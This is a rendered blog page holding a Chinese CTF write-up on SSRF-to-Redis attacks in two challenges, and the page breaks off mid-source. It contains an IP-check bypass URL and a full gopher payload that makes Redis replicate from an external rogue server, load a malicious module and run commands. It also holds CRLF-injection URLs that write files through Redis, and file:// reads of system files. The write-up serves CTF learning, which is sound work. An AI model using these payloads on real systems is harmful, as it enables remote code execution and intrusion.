@@ -1,0 +1,1026 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://volantis.js.org/#@byc_404'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+    <title>初探Redis-wdb玄武组ssrfme&amp;pwnhub公开赛 - byc_404&#39;s blog</title>
+  
+    <meta name="keywords" content="CTF,WEB,wp,redis">
+  
+  
+    <meta name="description" content="
+本学期最后一篇文章。写完就要复习去了。
+
+文章写在RCTF第一天。web狗真实自闭.本来想把假期前最后一篇文章留给RCTFwp的。现在看都不用写了,反正只会一道。原先听说过ROIS的web很强，zsx大师傅是巨佬，没想到恐怖如斯。(这就是ROIS跟zsx的可怕之处吗,怕了怕了)
+所以比赛第一天留意到有个pwnh...">
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="byc_404's blog">
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+  <link rel="shortcut icon" type='image/x-icon' href="/assests/favicon.ico">
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/css/style.css">
+
+  
+
+  <script>
+    function setLoadingBarProgress(num) {
+      document.getElementById('loading-bar').style.width=num+"%";
+    }
+  </script>
+
+  
+  
+</head>
+
+<body>
+  
+  <div class="cover-wrapper">
+    
+      <cover class='cover post half'>
+        <div class='cover-body'>
+  <div class='a'>
+    
+    
+      <p class="title">byc_404's blog</p>
+    
+    
+      <p class="subtitle">Do not go gentle into that good night</p>
+    
+  </div>
+  <div class='b'>
+    
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <input type="text" class="input u-search-input" placeholder="" />
+          <i class="icon fas fa-search fa-fw"></i>
+        </form>
+      </div>
+    
+    <div class='menu navigation'>
+      <ul class='cover-list-h'>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+      </cover>
+    
+    <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+<header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h'>
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+          
+            IGNITE <b><sup style='color:#3AA757'>@byc_404</sup></b>
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+<script>setLoadingBarProgress(40);</script>
+
+  </div>
+
+
+  <div class="l_body">
+    <div class='body-wrapper'>
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/">
+      初探Redis-wdb玄武组ssrfme&pwnhub公开赛
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://www.bycsec.top" rel="nofollow">
+    <img src="/assests/favicon.ico">
+    <p>byc_404</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：May 30, 2020</p>
+  </a>
+</div>
+
+            
+          
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          <ul>
+<li>本学期最后一篇文章。写完就要复习去了。</li>
+</ul>
+<p>文章写在RCTF第一天。web狗真实自闭.本来想把假期前最后一篇文章留给RCTFwp的。现在看都不用写了,反正只会一道。原先听说过ROIS的web很强，zsx大师傅是巨佬，没想到恐怖如斯。(这就是ROIS跟zsx的可怕之处吗,怕了怕了)</p>
+<p>所以比赛第一天留意到有个pwnhub公开赛，于是就去水了下，好歹是拿了个邀请码。这题因为是redis相关，联想到之前网鼎杯玄武的那道redis，加上自己原来基本没做过redis题，打算把这两道题相关知识点都总结下，当做这学期的收尾吧。</p>
+<a id="more"></a>
+
+
+<h2 id="网鼎杯玄武组ssrfme"><a href="#网鼎杯玄武组ssrfme" class="headerlink" title="网鼎杯玄武组ssrfme"></a>网鼎杯玄武组ssrfme</h2><p>这题真没想到，是郁师傅出的题……网上大部分做法都是主从复制RCE做的，不过郁师傅说试试不用主从复制做,不知道是什么姿势。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span>,$url); </span><br><span class="line">    <span class="keyword">if</span> (!$match_result) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $url_parse=parse_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>]; </span><br><span class="line">    $ip=gethostbyname($hostname); </span><br><span class="line">    $int_ip=ip2long($ip); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init(); </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        $result_info = curl_getinfo($ch); </span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close($ch); </span><br><span class="line">        var_dump($output); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123; </span><br><span class="line">        safe_request_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally. </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先拿到题目是经典的yulige标配ssrf。可以看到,我们允许使用的scheme是http,gopher以及dict。然后需要绕过一个内网ip检测，即可进行curl的ssrf.</p>
+<p>看到提示说访问hint.php。看来需要绕过ip限制进行内网访问。这个点之前总结ssrf时提到过,算是基本trick了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;bycsec.top@0.0.0.0&#x2F;hint.php</span><br></pre></td></tr></table></figure>
+<p><code>0.0.0.0</code>默认本地。<code>@</code>则是因为phpparse_url只会匹配到最后一个<code>@</code>后的内容的原因。这样我们就可以绕过了。<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/0.PNG" alt></p>
+<p>得到一个redis密码。下面是试图得到webshell</p>
+<p>通常来说ssrf+redis getshell主要是这几种姿势</p>
+<ol>
+<li>可写webshell。</li>
+<li>写ssh公钥</li>
+<li>写crontab反弹shell(仅限centos)</li>
+<li>主从复制RCE</li>
+</ol>
+<p>这里最简单的是可写webshell的情况。具体上就跟之前GKCTF那题一样，payload编码好就能用gopher打。</p>
+<p>此处虽然是php,但是并不能写webshell。剩下的当然是更不可能的。因为没有ssh跟crontab服务。那么值得一试的就是主从复制RCE了</p>
+<p>详细知识可以去看郁师傅在xray社区发的redis安全学习小记。</p>
+<p>主从复制，主要利用的就是redis<code>SLAVE OF</code>的命令，将一台redis的数据复制到另一台。前者为主节点，后者为从节点。这个复制过程是单向的。</p>
+<p>而我们redis主从复制RCE的方式，其实就是利用了redis简洁的协议，构造恶意服务器，将原本用于存储备份的rdb文件,替换为我们恶意的exp.so。这样节点redis中就会自动生成exp.so，使得我们可以用load_module进行rce.</p>
+<p>需要注意的是,因为利用redis写文件的方式写入exp.so会因为redis的大量无用数据padding影响其正常使用。而我们利用主从复制上传so，主要用到的是web应用层面的上传。而php默认的www-data是644,拥有只读权限。实战中是完全可以结合上传攻击的。</p>
+<p>因此本题只要用到两个两个工具即可<br><a href="https://github.com/xmsec/redis-ssrf" target="_blank" rel="noopener">https://github.com/xmsec/redis-ssrf</a><br><a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<p>前者用于生成payload，同时也可启动恶意server。后者主要是exp.so。建议把exp.so直接拷到前面文件夹下就行了。</p>
+<p>然后我们设置对应的payload。修改<code>ssrf-redis.py</code>在默认的rce模式下,只要改命令，lhost,lport,密码即可。然后启动恶意服务器。用前面生成好的payload直接打。<br><code>url=gopher%3a%2f%2fwww.bycsec.top%400.0.0.0%3a6379%2f_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%252430%250D%250Awelcometowangdingbeissrfme6379%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252414%250D%250A120.27.246.202%250D%250A%25244%250D%250A6666%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A%2ftmp%2f%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A%2ftmp%2fexp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252413%250D%250Acat%2524%257BIFS%257D%2ffl%252A%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A</code><br>第一次打会建立好主从复制。这时候就可以关掉server直接用ssrf命令进行RCE了。</p>
+<p><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/1.PNG" alt></p>
+<h2 id="pwnhub公开赛-七爪鱼-flag在线爬取系统"><a href="#pwnhub公开赛-七爪鱼-flag在线爬取系统" class="headerlink" title="pwnhub公开赛-七爪鱼 flag在线爬取系统"></a>pwnhub公开赛-七爪鱼 flag在线爬取系统</h2><p>这次做题本来是因为被RCTF虐惨了跑去看看的。结果难度似乎适中。刚好给我一点点满足感。</p>
+<p>首先题目server是gunicorn的配置。这个从header中可以看出来。然后注册登录后发现有一个爬虫<code>/spider</code>路由。拿<code>file:///etc/passwd</code>打一发可以读到/etc/passwd.看来又是个ssrf。<br><img src="/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/2.PNG" alt><br>同时注意到用户里有redis-db跟server.看来是有redis了。</p>
+<p>简单探测下发现6379端口有redis的报错回显。</p>
+<p>第一反应先读了下bash_history。发现一个没权限一个不存在。(假如能用这种方式知道根目录flag的名称那就会简便很多，这也是我在wustctf当时直接读到flag的非预期思路)</p>
+<p>然后期间触发了报错。发现是python的urllib库调用的urlopen。这个库熟悉的话应该都知道是存在CRLF的洞的。我们可以用这个ssrf往自己服务器打一波。nc监听的话会发现是python3.5的urllib。</p>
+<p>对urllib的ssrf,用http协议下的可以直接打</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aKEYS%20*%0d%0apadding</span><br><span class="line">只返回$-1</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aconfig%20set%20dir%20&#x2F;tmp%0d%0aconfig%20set%20dbfilename%20byc%0d%0asave%0d%0apadding</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;tmp&#x2F;byc</span><br><span class="line">成功写入文件</span><br></pre></td></tr></table></figure>
+<p>那么此时大致确认可以用这个ssrf打redis了。但是要注意的是我们python服务器不能直接写webshell。不能写定时和key。而且由于gopher不支持也不能进行RCE。换言之我们只能对redis进行命令操作。所以我想先尝试探测源码信息</p>
+<p>首先是<code>/proc/self/cmdline</code>。读到了gunicorn的相关配置。</p>
+<p><code>/usr/local/python3/bin/python3.5/usr/local/python3/bin/gunicorn--config=config.pyrun:app</code></p>
+<p>得到run.py。这里直接用<code>/proc/self/cwd/run.py</code>去读工作目录下的源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> sipder <span class="keyword">import</span> Spider</span><br><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> StrictRedis</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, redirect, session, request, make_response, url_for, abort, render_template_string</span><br><span class="line"><span class="keyword">from</span> user <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">redis = StrictRedis(host=<span class="string">'127.0.0.1'</span>,port=<span class="number">6379</span>,db=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">"Cookie"</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">"login"</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">'GET'</span>:</span><br><span class="line">        username = request.form.get(<span class="string">'username'</span>)</span><br><span class="line">        password = request.form.get(<span class="string">'password'</span>)</span><br><span class="line">        cookie = Cookie()</span><br><span class="line">        cookie.create = username</span><br><span class="line">        cookie = cookie.create</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> redis.exists(cookie):</span><br><span class="line">                user = pickle.loads(redis.get(cookie))</span><br><span class="line">                <span class="keyword">if</span> user.verify_pass(password):</span><br><span class="line">                    resp = make_response(redirect(url_for(<span class="string">'home'</span>)))</span><br><span class="line">                    resp.set_cookie(<span class="string">'Cookie'</span>,cookie)</span><br><span class="line">                    <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"login.html"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/register/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">'GET'</span>:</span><br><span class="line">        email = request.form.get(<span class="string">'email'</span>)</span><br><span class="line">        username = request.form.get(<span class="string">'username'</span>)</span><br><span class="line">        password = request.form.get(<span class="string">'password'</span>)</span><br><span class="line">        user = User(email,username,password)</span><br><span class="line">        cookie = Cookie()</span><br><span class="line">        cookie.create = username</span><br><span class="line">        cookie = cookie.create</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> redis.exists(cookie):</span><br><span class="line">                redis.set(cookie,pickle.dumps(user))</span><br><span class="line">                resp = make_response(redirect(url_for(<span class="string">'home'</span>)))</span><br><span class="line">                resp.set_cookie(<span class="string">"Cookie"</span>,cookie)</span><br><span class="line">                <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"register.html"</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/home/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">'Cookie'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> Cookie.verify(cookie) <span class="keyword">and</span> redis.exists(cookie):</span><br><span class="line">            user = redis.get(cookie)</span><br><span class="line">            user = pickle.loads(user)</span><br><span class="line">            <span class="keyword">if</span> request.method != <span class="string">"GET"</span>:</span><br><span class="line">                formlist = request.form.to_dict()</span><br><span class="line">                User.modify_info(user,formlist)</span><br><span class="line">                redis.set(cookie,pickle.dumps(user))</span><br><span class="line">                <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>,user=user)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>,user=user)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">"login"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/spider/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spider</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">'Cookie'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> Cookie.verify(cookie) <span class="keyword">and</span> redis.exists(cookie):</span><br><span class="line">            user = redis.get(cookie)</span><br><span class="line">            user = pickle.loads(user)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">500</span>)</span><br><span class="line">    result=<span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">        result=<span class="string">''</span></span><br><span class="line">    <span class="keyword">elif</span> request.method != <span class="string">"GET"</span> <span class="keyword">and</span> request.form.get(<span class="string">'url'</span>)!=<span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target_url = request.form.get(<span class="string">'url'</span>)</span><br><span class="line">            new_spider = Spider(target_url)</span><br><span class="line">            result = new_spider.spiderFlag()</span><br><span class="line">        <span class="keyword">except</span> Excetion <span class="keyword">as</span> e:</span><br><span class="line">            result = e</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"spider.html"</span>,result=str(result),user=user)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/testSpider/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TSpider</span><span class="params">()</span>:</span></span><br><span class="line">    html = <span class="string">'&lt;div id="flag"&gt;Flag&#123;hahaha This is a test for tested Spider mode&#125;&lt;/div&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span 